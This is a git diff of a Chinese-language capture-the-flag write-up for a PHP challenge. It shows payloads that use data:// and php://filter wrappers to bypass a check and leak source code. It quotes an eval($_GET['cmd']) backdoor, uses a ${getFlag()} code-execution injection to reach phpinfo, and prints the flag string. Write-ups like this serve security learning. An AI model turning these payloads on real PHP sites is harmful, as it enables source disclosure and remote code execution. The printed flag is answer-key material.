@@ -6,43 +6,40 @@ category: CTF
 
 ![](https://pic.npiter.de/file/1771550796591_20260220092634165.png)
 
-涉及到php
-
-先看题目
+涉及 PHP 伪协议。先看题目：
 
 ![](https://pic.npiter.de/file/1771550809468_20260220092634166.png)
 
-> [!TIP]
->
->
-> 需要读取text的内容是否为I have a dream，且file参数里面不能含有flag
+条件：读取 `text` 的内容必须为 `I have a dream`，且 `file` 参数不能含有 `flag`。
 
-#### 构造使用php伪协议进行读取
+## 构造 PHP 伪协议
 
 ```
 /?text=data://plain/text,I%20have%20a%20dream&file=php://filter/read=convert.base64-encode/resource=next.php
-
 ```
 
-得到base64
+得到 base64 编码的源码：
 
 ![](https://pic.npiter.de/file/1771550811150_20260220092634167.png)
 
-进行解码
+解码：
 
 ![](https://pic.npiter.de/file/1771550809125_20260220092634168.png)
 
-#### 发现命令执行漏洞：@eval($_GET[‘cmd’]);
+## 发现命令执行漏洞
+
+源码中有 `@eval($_GET['cmd']);`，构造：
 
 ```
 /next.php?\S*=${getFlag()}&&cmd=phpinfo();
-
 ```
 
 ![](https://pic.npiter.de/file/1771550820153_20260220092634169.png)
 
-#### Ctrl+G搜索flag
+## Ctrl+G 搜索 flag
+
+在 phpinfo 页面中搜索 flag：
 
 ![](https://pic.npiter.de/file/1771550823995_20260220092634170.png)
 
-**NSSCTF{453a61d6-6601-4a35-bc99-2090d2f0a749}**
+**`NSSCTF{453a61d6-6601-4a35-bc99-2090d2f0a749}`**
